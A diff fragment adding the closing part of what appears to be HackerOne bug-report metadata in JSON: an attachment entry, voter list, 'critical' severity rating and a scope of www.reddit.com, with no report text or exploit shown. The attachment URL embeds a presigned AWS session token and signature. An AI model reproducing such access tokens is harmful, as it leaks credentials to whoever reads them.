+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fu6metvwusj8br8u4xbjea7dtpqh?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=753c1740859f944ed8f1e0fcbba3ad904d27c840ed7823fa642e443408b06aad",
+      "file_size": 76178,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 503,
+  "voters": [
+    "nahuelrm_",
+    "awhacken",
+    "alienisgrinding",
+    "corrupted_bytes",
+    "googlelai",
+    "orange303",
+    "conductor8238",
+    "ryuku",
+    "remy1",
+    "leodog896",
+    "and 493 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18825,
+    "asset_type": "URL",
+    "asset_identifier": "www.reddit.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
